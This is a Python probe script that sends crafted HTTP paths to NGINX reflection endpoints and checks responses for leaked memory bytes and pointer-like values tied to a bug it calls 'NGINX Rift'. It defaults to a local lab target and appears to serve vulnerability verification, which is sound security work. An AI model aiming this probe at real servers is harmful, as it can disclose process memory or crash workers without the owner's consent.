#!/usr/bin/env python3
import argparse
import re
import socket
import sys
from dataclasses import dataclass
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parents[1]))
import nginx_rifter as rifter


PREFIX = "PPPPPPPPPPP"


@dataclass
class Response:
    status: str
    headers: dict
    body: bytes
    raw: bytes


def request(host, port, path, timeout=5):
    with socket.create_connection((host, port), timeout=timeout) as sock:
        sock.settimeout(timeout)
        req = (
            f"GET {path} HTTP/1.1\r\n"
            f"Host: {host}\r\n"
            "Connection: close\r\n"
            "\r\n"
        ).encode("latin-1")
        sock.sendall(req)
        chunks = []
        while True:
            try:
                data = sock.recv(65536)
            except socket.timeout:
                break
            if not data:
                break
            chunks.append(data)
    raw = b"".join(chunks)
    head, sep, body = raw.partition(b"\r\n\r\n")
    lines = head.split(b"\r\n") if head else []
    status = lines[0].decode("latin-1", errors="replace") if lines else "<no response>"
    headers = {}
    for line in lines[1:]:
        if b":" in line:
            key, value = line.split(b":", 1)
            headers[key.decode("latin-1").lower()] = value.strip().decode(
                "latin-1", errors="replace"
            )
    return Response(status=status, headers=headers, body=body, raw=raw)


def expected_reflection(payload, newline=False):
    expanded = (PREFIX + payload.replace("+", "%2B")).encode("latin-1")
    expected_len = len(PREFIX) + len(payload)
    out = expanded[:expected_len]
    return out + (b"\n" if newline else b"")


def pointer_like_offsets(blob):
    hits = []
    for match in re.finditer(rb"[\x00-\xff]{8}", blob):
        value = int.from_bytes(match.group(0), "little")
        if 0x0000550000000000 <= value <= 0x00007fffffffffff:
            hits.append((match.start(), value))
    return hits[:8]


def byte_profile(blob):
    nonprint = sum(1 for b in blob if b not in b"\r\n\t" and (b < 0x20 or b > 0x7e))
    return f"len={len(blob)} nonprint={nonprint} ptr_like={len(pointer_like_offsets(blob))}"


def interesting_memory_bytes(blob):
    nonprint = any(b not in b"\r\n\t" and (b < 0x20 or b > 0x7e) for b in blob)
    return nonprint or bool(pointer_like_offsets(blob))


def check_body(payload, response):
    if not response.raw:
        print("    no response; likely worker reset/crash, not a memory disclosure")
        return "reset"
    expected = expected_reflection(payload, newline=True)
    matched = response.body == expected
    print(f"    body profile: {byte_profile(response.body)}")
    print(f"    expected deterministic reflection: {'yes' if matched else 'no'}")
    if not matched:
        print(f"    expected prefix: {expected[:96]!r}")
        print(f"    observed prefix: {response.body[:96]!r}")
    for offset, value in pointer_like_offsets(response.body):
        print(f"    pointer-like body bytes at +{offset}: {value:#x}")
    if matched:
        return "clean"
    return "interesting" if interesting_memory_bytes(response.body) else "deviation"


def check_header(payload, response):
    if not response.raw:
        print("    no response; likely worker reset/crash, not a memory disclosure")
        return "reset"
    header = response.headers.get("x-original", "")
    observed = header.encode("latin-1", errors="replace")
    expected = expected_reflection(payload, newline=False)
    matched = observed == expected
    print(f"    X-Original profile: {byte_profile(observed)}")
    print(f"    expected deterministic reflection: {'yes' if matched else 'no'}")
    if not matched:
        print(f"    expected prefix: {expected[:96]!r}")
        print(f"    observed prefix: {observed[:96]!r}")
    for offset, value in pointer_like_offsets(observed):
        print(f"    pointer-like header bytes at +{offset}: {value:#x}")
    if matched:
        return "clean"
    return "interesting" if interesting_memory_bytes(observed) else "deviation"


def main():
    parser = argparse.ArgumentParser(
        description="Probe non-LFI NGINX Rift leak candidates over normal HTTP responses."
    )
    parser.add_argument("--target", default="127.0.0.1:19321")
    parser.add_argument("--port", type=int, default=19321)
    parser.add_argument("--a-count", type=int, default=127)
    parser.add_argument("--plus-counts", default="0,16,64,128,256,512,768,962")
    parser.add_argument("--timeout", type=float, default=5)
    args = parser.parse_args()

    host, port = rifter.parse_target(args.target, args.port)
    counts = [int(item) for item in args.plus_counts.split(",") if item.strip()]
    summary = {"clean": 0, "reset": 0, "deviation": 0, "interesting": 0}

    print(f"[*] target=http://{host}:{port}")
    print("[*] primitive=remote HTTP only; no LFI/phpinfo/procfs/core reads")
    print("[*] candidates=return body, add_header, redirect Location")

    for plus_count in counts:
        payload = "A" * args.a_count + "+" * plus_count + "ZZZZZZZZ"
        print(f"\n[+] plus_count={plus_count} payload_len={len(payload)}")

        body_resp = request(host, port, f"/reflect_body/{payload}", args.timeout)
        print(f"  /reflect_body status: {body_resp.status}")
        summary[check_body(payload, body_resp)] += 1

        header_resp = request(host, port, f"/reflect_header/{payload}", args.timeout)
        print(f"  /reflect_header status: {header_resp.status}")
        summary[check_header(payload, header_resp)] += 1

        redirect_resp = request(host, port, f"/reflect_redirect/{payload}", args.timeout)
        location = redirect_resp.headers.get("location", "")
        loc_blob = location.encode("latin-1", errors="replace")
        print(f"  /reflect_redirect status: {redirect_resp.status}")
        print(f"    Location profile: {byte_profile(loc_blob)}")
        print(f"    Location prefix: {loc_blob[:96]!r}")
        for offset, value in pointer_like_offsets(loc_blob):
            print(f"    pointer-like Location bytes at +{offset}: {value:#x}")
            summary["interesting"] += 1

    print(
        "\n[*] summary: "
        + ", ".join(f"{key}={value}" for key, value in summary.items())
    )
    if summary["interesting"] == 0:
        print("[+] no passive memory disclosure observed")
        if summary["reset"]:
            print("[*] worker resets/crashes occurred, but did not return leaked bytes")
        return 0

    print("[!] pointer-like or non-print memory bytes appeared in a response")
    return 1


if __name__ == "__main__":
    raise SystemExit(main())
